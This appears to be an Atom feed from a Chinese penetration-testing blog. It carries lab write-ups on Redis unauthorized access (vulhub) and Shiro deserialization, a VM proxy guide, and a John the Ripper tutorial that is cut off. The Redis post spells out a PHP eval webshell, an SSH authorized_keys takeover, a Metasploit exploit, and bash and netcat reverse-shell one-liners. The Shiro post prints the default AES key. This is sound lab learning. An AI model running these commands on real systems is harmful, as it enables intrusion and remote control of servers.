<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦~醒🥝</title>
  
  
  <link href="https://blog.m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://blog.m3x1.cn/"/>
  <updated>2025-03-25T04:41:39.422Z</updated>
  <id>https://blog.m3x1.cn/</id>
  
  <author>
    <name>梦~醒🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【vulhub漏洞靶场】redis漏洞及redis漏洞复现</title>
    <link href="https://blog.m3x1.cn/posts/2ab81980.html"/>
    <id>https://blog.m3x1.cn/posts/2ab81980.html</id>
    <published>2025-03-24T16:00:00.000Z</published>
    <updated>2025-03-25T04:41:39.422Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="漏洞详情">漏洞详情</h2><blockquote><p>影响版本 Redis 2.x，3.x，4.x，5.x</p></blockquote><p>Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。</p><p>攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。</p><p>漏洞的产生条件有以下两点:</p><p>(1) Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p><p>(2) 没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p><h2 id="漏洞复现">漏洞复现</h2><blockquote><p>kali靶机： 192.168.192.132</p><p>kali攻击机：192.168.192.135</p></blockquote><h4 id="靶机设置">靶机设置</h4><p>进入vulhub靶场的redis/4-unacc目录，输入命令，然后等待加载完毕。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085647378.png" alt="image-20250325085647378"></p><blockquote><p>小提示：如果不成功，可能是没有挂代理（懂吧？）</p></blockquote><p>输入命令查看端口是6379</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325085748429.png" alt="image-20250325085748429"></p><p>我们用nmap扫一下靶机，也可以看到6379端口打开了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.192.132 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090133919.png" alt="image-20250325090133919"></p><p>浏览器访问看看，能打开就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325090518098.png" alt="image-20250325090518098"></p><h4 id="攻击机设置">攻击机设置</h4><p>安装redis-cli远程连接工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure><p>然后解压，进入该目录进行编译，等待完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd redis-stable</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091518998.png" alt="image-20250325091518998"></p><p>出现如上界面就说明成功了</p><h4 id="漏洞利用流程">漏洞利用流程</h4><h5 id="写入webshell">写入webshell</h5><ol><li>目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)</li><li>需要具有读写增删改查权</li></ol><p>用redis-cli命令远程免密登录redis主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 无密码登录命令</span><br><span class="line">redis-cli -h 目标主机IP</span><br><span class="line"># 有密码登录命令</span><br><span class="line">redis-cli -h 目标主机IP -p 端口6379 -a 登录密码</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325091905278.png" alt="image-20250325091905278"></p><p>这样就说明成功了，</p><p>redis操作命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">info  #查看redis的信息和服务器信息</span><br><span class="line">flushall 删除所有数据</span><br><span class="line">del key  删除键为key的数据</span><br><span class="line">get key  获得参数key的数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html  #将shell移到网站默认根目录</span><br><span class="line">config set dbfilename redis.php #创建shell文件</span><br><span class="line">set webshell &quot;&lt;?php eval($_POST[1]); ?&gt;&quot;  写入一句话木马，然后蚁剑连接</span><br><span class="line">或者</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php eval($_POST[1]); ?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>由于靶机没有开启web服务，所以就不演示了。</p><h5 id="使用py脚本执行远程命令">使用py脚本执行远程命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/redis-rogue-getshell.git</span><br><span class="line">cd redis-rogue-getshell/RedisModulesSDK/exp</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325094921511.png" alt="image-20250325094921511"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ../../   #回到redis-rogue-getshell目录下</span><br><span class="line">./redis-master.py -r 192.168.239.128 -p 6379 -L 192.168.239.128 -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</span><br><span class="line">(第一个ip是靶机，第二个ip是攻击机,-c后面跟执行的命令)</span><br></pre></td></tr></table></figure><h5 id="ssh公私钥免密登录">ssh公私钥免密登录</h5><h6 id="原理">原理</h6><p>登陆linux有几种方式，最常用的是密码登陆和RSA key 登陆，RSA key登陆是生成一个公私对应的秘钥，然后将公钥放到linux系统的/root/.ssh/authorized_keys的文件中，我们本地客户端通过导入对应私钥进行登陆，这就是RSA key的登陆方式。</p><h6 id="为什么redis可以获取服务器的root权限呢？">为什么redis可以获取服务器的root权限呢？</h6><p>上面RSA key的登陆方式在服务器方面是要将公钥写入authorized_keys文件中的，而redis有一种持久化方式是生成RDB文件，通过持久化将公钥写入root下的authored_keys文件里，这样就将非法的公钥写到了验证文件里，后面我们拿对应私钥登陆即可。（但是这种方式需要redis是root启动的情况下使用，因为非root权限无法进入/root目录）</p><h6 id="步骤">步骤</h6><p>在攻击机中生成ssh公钥和私钥文件，密码为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>进入/home/kali/.ssh目录: 将生成的公钥保存到sshkey.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; sshkey.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102503591.png" alt="image-20250325102503591"></p><p>使用redis-cli -h ip命令连接靶机，把sshkey.txt写入redis中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sshkey.txt | redis-cli -h 192.168.192.132 -x set crack</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325102811549.png" alt="image-20250325102811549"></p><p>然后用redis-cli连接靶机，然后更改目标服务器Redis备份路径为ssh公钥存放目录(默认为/root/.ssh)</p><p>此处因为靶场中的redis没有root权限，就不演示了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br></pre></td></tr></table></figure><p>设置上传公钥备份文件名为authorized_keys:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename authorized_keys</span><br></pre></td></tr></table></figure><p>然后在攻击机上使用ssh免密码登录靶机，利用私钥就能成功登入redis服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@ip</span><br></pre></td></tr></table></figure><h5 id="使用msf进行漏洞利用">使用msf进行漏洞利用</h5><p>使用searchsploit搜索redis相关漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit redis</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325104753221.png" alt="image-20250325104753221"></p><p>可以看到相关漏洞都在metasploit里</p><p>启动metasploit（注意要在root下启动，不然攻击时会报错）,然后检索redis相关exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search redis type:exploit</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325105152802.png" alt="image-20250325105152802"></p><p>看到有一个cmd利用的漏洞，使用该模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/redis/redis_replication_cmd_exec</span><br></pre></td></tr></table></figure><p>然后查看需要设置的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 192.168.192.135</span><br><span class="line">set RHOST 192.168.192.132</span><br><span class="line">set SRVHOST 192.168.192.135</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325110217792.png" alt="image-20250325110217792"></p><p>然后运行，出现如下情况就成功了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325111732432.png" alt="image-20250325111732432"></p><h5 id="反弹连接">反弹连接</h5><p>这个方法主要适用于马被杀了，或者靶机在内网之中。</p><p>常见端口监听方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">netcat：nc -lvp 7777</span><br><span class="line"></span><br><span class="line">msf：</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.37.130</span><br><span class="line">set lport 7777</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">socat：socat TCP-LISTEN:7777 - (kali系统)</span><br></pre></td></tr></table></figure><p>常见建立连接方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Linux bash：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机监听端口 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">netcat：</span><br><span class="line">nc -e /bin/bash 攻击机ip 攻击机监听端口</span><br></pre></td></tr></table></figure><p>这里我就演示nc和bash的配合：</p><p>攻击机进行nc监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>靶机使用bash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.192.135/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113528895.png" alt="image-20250325113528895"></p><p>之后在监听机上就能看到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113511333.png" alt="image-20250325113511333"></p><p>然后就可以执行命令了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250325113712853.png" alt="image-20250325113712853"></p><p>可以看到是靶机的ip地址。</p><p>主动关闭连接直接在攻击机上exit。</p>]]></content>
    
    
    <summary type="html">🥧redis漏洞原理；【vulhub漏洞靶场】redis漏洞及redis漏洞复现；利用redis写入webshell；python脚本利用redis；ssh公钥免登录利用redis；msf利用redis；反弹shell利用redis</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>vm虚拟机如何实现与主机共享代理实现科学上网</title>
    <link href="https://blog.m3x1.cn/posts/5892bf96.html"/>
    <id>https://blog.m3x1.cn/posts/5892bf96.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:04:32.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="方法一：使用tun模式（推荐）">方法一：使用tun模式（推荐）</h2><p>相关文章：<a href="https://clashvmess.com/3841.html">深度解析clash开tun模式：配置与使用指南 - Clash最新教程</a></p><p>如果主机是使用代理软件走代理的话，比如clash， 可以直接使用Tun模式。Tun模式下，代理软件会创建一个虚拟网卡，主机上的进程（包括虚拟机）的网络请求都会重定向到这个虚拟网卡。这种模式拦截了所有进程的网络请求，有些进程并不遵守系统代理，比如终端, pip, docker等等，Tun模式专治这种。</p><h2 id="方法二：使用系统代理模式">方法二：使用系统代理模式</h2><p><strong>很麻烦，推荐第一种</strong></p><p>VM软件配置<br>1.VM虚拟网络编辑器<br>打开虚拟网络编辑器（方式：编辑-&gt;虚拟网络编辑器),</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/216a0bd2ce71cea38b1f4060f7fe222d.png" alt="img"></p><p>然后点击更改设置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b11d02909648f7584aa1ce3936623e16.png" alt="img"></p><p>2.配置VMnet8和VMnet1<br>VMnet8【子网配置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4914dfc9f3dabeed102f4c586b9d7df.png" alt="img"></p><p>【NAT设置】如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0cfcf812206f19a1f412471b775de26b.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5637516b8ae4604ce33c42b7f64c5097.png" alt="img"></p><p>【DHCP设置】如下：（可以理解为虚拟机的ip范围， 不要跟上图配置的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/035253150ff47c67925cfeabecb99510.png" alt="img"></p><p>【VMnet1】采用默认配置就可以了，当然你也可以按照上述vmnet8的方式修改一个容易记住的ip：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a544c334a48ba9745ba0c480fc19e90.png" alt="img"></p><p>四、主机IP配置<br>windows进入打开设置-&gt;网络</p><p>【2024-9-18补充】【可选START  // 表示这个这个范围是可有可无的】</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7642faecf3cd6799ce2c0e73d8c90f4e.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/64d182eddb6d4b654d1a3b89f0ca5508.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/aeaecd6a90ce5b0bdbf72c3502f8f7ef.png" alt="img"></p><p>双击上述红框，然后配置如下：（这里不要跟之前的网关冲突了）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/78c1f95ff9c312d75159e9012aee7f2d.png" alt="img"></p><p>【2024-9-18补充】【可选END   // 表示这个范围是可有可无的】</p><p>代理软件要开启【Allow LAN】：（这里要记住端口, 我的是7890）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/11c1bd289cab27c99074b57b67ca05a6.png" alt="img"></p><p>然击后点：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1393a2df6b6644e3ba6a7f4a1ba42e77.png" alt="img"></p><p>记住下面的接口ip,这个ip需要在Vm虚拟机中使用， 两个都可以用</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4bec5d2c26060c002847ed712896f740.png" alt="img"></p><p>在windows终端下输入ipconfig同样可以查到：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5ab320459f15a3b4338421f1c5dfe6d6.png" alt="img"></p><p>五、虚拟机代理ip配置<br>在配置代理之前需要设置网络适配器， 我们之前配置了VMnet8，在这里可以使用。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3799988deebfaaf7cef1b13c329631da.png" alt="img"></p><p>5.1 虚拟机上用【设置】配置代理<br>用【设置】配置代理，代理设置会影响所有图形app， 比如浏览器，shell…</p><p>但是却影响不了ssh(用ssh连接虚拟机ubuntu)终端，所以在使用ssh还需要配置代理，参考第七节。</p><p>当然这种配置也影响不了很多需要单独配置代理的app, 比如conda, pip, docker等等</p><p>进入虚拟机，配置ip,如果是Ubuntu可以参考下面的配置：(注意下图的端口，要跟代理软件的端口一致)</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/05f8d947f6ccce3f08fc91b7118ddf3d.png" alt="img"></p><p>然后可以打开浏览器看外网，或者终端：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/896ca71206197898e7112c685fb5919f.png" alt="img"></p>]]></content>
    
    
    <summary type="html">🥧vm虚拟机如何实现与主机共享代理实现科学上网;软件代理使用tun模式;系统代理设置方法</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞全解析</title>
    <link href="https://blog.m3x1.cn/posts/78877ffd.html"/>
    <id>https://blog.m3x1.cn/posts/78877ffd.html</id>
    <published>2025-03-19T16:00:00.000Z</published>
    <updated>2025-03-20T16:03:45.135Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍Apache-Shiro-1-2-4-反序列化漏洞（CVE-2016-4437）">介绍<strong>Apache Shiro 1.2.4</strong> 反序列化漏洞（<strong>CVE-2016-4437</strong>）</h2><p>Apache Shiro是⼀款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、</p><p>易⽤，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的⽤户信息序列化后存储在名为remember-me的Cookie</p><p>中。攻击者可以使⽤Shiro的默认密钥伪造⽤户Cookie，触发Java反序列化漏洞，进⽽在⽬标机</p><p>器上执⾏任意命令。</p><h2 id="漏洞成因">漏洞成因</h2><p>其漏洞的核⼼成因是cookie中的身份信息进⾏了AES加解密，⽤于加解密的密钥应该是绝对保密</p><p>的，但在shiro版本&lt;=1.2.24的版本中使⽤了固定的密钥。因此，验证漏洞的核⼼应该还是在于我</p><p>们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>或者其他我们可以通过脚本⼯具爆破出来的密钥，那么shiro550漏</p><p>洞才⼀定存在。</p><h2 id="漏洞环境及复现">漏洞环境及复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 下载项⽬</span><br><span class="line"></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub</span><br><span class="line"></span><br><span class="line">master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"></span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进⼊某⼀个漏洞/环境的⽬录</span><br><span class="line"></span><br><span class="line">cd shiro/CVE-2016-4437</span><br><span class="line"></span><br><span class="line"># 启动环境</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#启动容器</span><br><span class="line">docker run vulhub/shiro:1.2.4</span><br></pre></td></tr></table></figure><h2 id="Shiro特征"><strong>Shiro</strong>特征</h2><p>⾸先应该判断⼀个⻚⾯的登录是否使⽤了shiro框架进⾏身份验证、授权、密码和会话管理。判断</p><p>⽅法在于：勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响</p><p>应包中是否有Set-cookie:rememberMe=deleteMe字段。类似于下图这样：</p><blockquote><p>\1. 未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie⾥也没有</p><p>deleteMe字段</p><p>\2. 登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe= deleteMe</p><p>字段</p><p>\3. 不勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字</p><p>段。但是之后的所有请求中Cookie都不会有RememberMe字段</p><p>\4. 勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字段，</p><p>还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段</p><p>\5. 或者可以在cookie后⾯⾃⼰加⼀个rememberMe=1，看返回包有没有rememberMe=</p><p>deleteMe</p></blockquote>]]></content>
    
    
    <summary type="html">🥧Shiro反序列化漏洞全解析;shiro漏洞成因;shiro漏洞环境及shiro漏洞复现;shiro漏洞特征</summary>
    
    
    
    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>linux、windows密钥暴力破解工具john的使用</title>
    <link href="https://blog.m3x1.cn/posts/b2b54c4f.html"/>
    <id>https://blog.m3x1.cn/posts/b2b54c4f.html</id>
    <published>2025-03-18T16:00:00.000Z</published>
    <updated>2025-03-19T14:19:17.023Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h4 id="什么是john">什么是john</h4><p><code>John the Ripper</code> 是一款大受欢迎的、免费的开源软件。也是一个基于字典的快速破解密码的工具，是一款用于在已知密文的情况下尝试破解出明文的破解密码软件，支持目前大多数的加密算法，如 <code>DES</code> 、 <code>MD4</code> 、 <code>MD5</code> 等。 <code>John the Ripper</code> 支持字典破解方式和暴力破解方式。它支持多种不同类型的系统架构，包括 <code>Unix</code> 、 <code>Linux</code> 、 <code>Windows</code> 、 <code>DOS</code> 模式、 <code>BeOS</code> 和 <code>OpenVMS</code> ，主要目的是破解不够牢固的 <code>Unix/Linux</code> 系统密码。</p><p>john一般是kali自带。</p><h4 id="john参数表">john参数表</h4><p><code>john</code> 命令的具体参数选项如下表：</p><table><thead><tr><th>选 项</th><th>描 述</th></tr></thead><tbody><tr><td>–single</td><td>single crack 模式，使用配置文件中的规则进行破解</td></tr><tr><td>–wordlist=FILE–stdin</td><td>字典模式，从 FILE 或标准输入中读取词汇</td></tr><tr><td>–rules</td><td>打开字典模式的词汇表切分规则</td></tr><tr><td>–incremental[=MODE]</td><td>使用增量模式</td></tr><tr><td>–external=MODE</td><td>打开外部模式或单词过滤，使用 [List.External:MODE] 节中定义的外部函数</td></tr><tr><td>–stdout[=LENGTH]</td><td>不进行破解，仅仅把生成的、要测试是否为口令的词汇输出到标准输出上</td></tr><tr><td>–restore[=NAME]</td><td>恢复被中断的破解过程，从指定文件或默认为 $JOHN/john.rec 的文件中读取破解过程的状态信息</td></tr><tr><td>–session=NAME</td><td>将新的破解会话命名为 NAME ，该选项用于会话中断恢复和同时运行多个破解实例的情况</td></tr><tr><td>–status[=NAME]</td><td>显示会话状态</td></tr><tr><td>–make-charset=FILE</td><td>生成一个字符集文件，覆盖 FILE 文件，用于增量模式</td></tr><tr><td>–show</td><td>显示已破解口令</td></tr><tr><td>–test</td><td>进行基准测试</td></tr><tr><td>–users=[-]LOGIN|UID[,…]</td><td>选择指定的一个或多个账户进行破解或其他操作，列表前的减号表示反向操作，说明对列出账户之外的账户进行破解或其他操作</td></tr><tr><td>–groups=[-]GID[,…]</td><td>对指定用户组的账户进行破解，减号表示反向操作，说明对列出组之外的账户进行破解。</td></tr><tr><td>–shells=[-]SHELL[,…]</td><td>对使用指定 shell 的账户进行操作，减号表示反向操作</td></tr><tr><td>–salts=[-]COUNT</td><td>至少对 COUNT 口令加载加盐，减号表示反向操作</td></tr><tr><td>–format=NAME</td><td>指定密文格式名称，为 DES/BSDI/<a href="https://so.csdn.net/so/search?q=MD5&amp;spm=1001.2101.3001.7020">MD5</a>/BF/AFS/LM 之一</td></tr><tr><td>–save-memory=LEVEL</td><td>设置内存节省模式，当内存不多时选用这个选项。 LEVEL 取值在 1~3 之间</td></tr></tbody></table><h4 id="etc-passed和etc-shadow文件">etc/passed和etc/shadow文件</h4><p>首先要知道 /etc/passwd文件和 /etc/shadow文件</p><p>/etc/passwd文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>上面数据为passwd文件的一个片段，我们可以发现每一行都被<code>分号</code>分为了<code>7部分</code>。这七部分分别为：</p><blockquote><ol><li>用户名</li><li>密码(passwd文件人人可读，所以不放明文密码，真正的密码在/etc/shadow文件中)</li><li>uid</li><li>gid</li><li>用户注释</li><li>主目录</li><li>登陆的shell类型(bash/zsh/sh等)</li></ol></blockquote><p>/etc/shadow文件格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$f0EotKbw$sLAujh0EleiXNAuoph20iL517cXlcExWLATwz3xgCEyYlsIECUa9nuDdiT5/ntWfJDfxFhYGcMknkCq5Awgf20:15118:0:99999:7:::</span><br></pre></td></tr></table></figure><p>也是被分号隔开格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">用户名</span><br><span class="line">密码，其中\$6\$是表示一种类型标记为6的密码散列suans fa,这里指SHA-512哈希算法，1 代表 MD5，5 代表 SHA-256，6 代表 SHA-512,salt 表示密码学中的 Salt, 系统随机生成 encrypted 表示密码的 hash,其中f0EotKbw为salt。</span><br><span class="line">“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCOLinux中，这个时间起点是1970年1月1日。</span><br><span class="line">“最小时间间隔”指的是两次修改口令之间所需的最小天数。</span><br><span class="line">“最大时间间隔”指的是口令保持有效的最大天数。</span><br><span class="line">“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。</span><br><span class="line">“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。</span><br><span 